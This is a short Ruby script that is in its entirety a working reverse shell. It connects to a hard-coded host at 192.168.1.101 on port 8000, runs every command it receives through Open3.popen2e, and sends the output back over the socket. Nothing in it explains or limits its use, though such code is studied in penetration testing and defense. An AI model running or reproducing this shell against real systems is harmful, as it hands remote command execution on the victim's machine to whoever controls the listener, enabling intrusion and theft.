#!/usr/bin/ruby

require "socket"
require "open3"

host = "192.168.1.101"
port = "8000"

s = TCPSocket.open(host, port)

while true
  comm = s.gets.chomp
  Open3.popen2e("#{comm}") do |stdin , stdothers|
    IO.copy_stream(stdothers, s)
  end
end
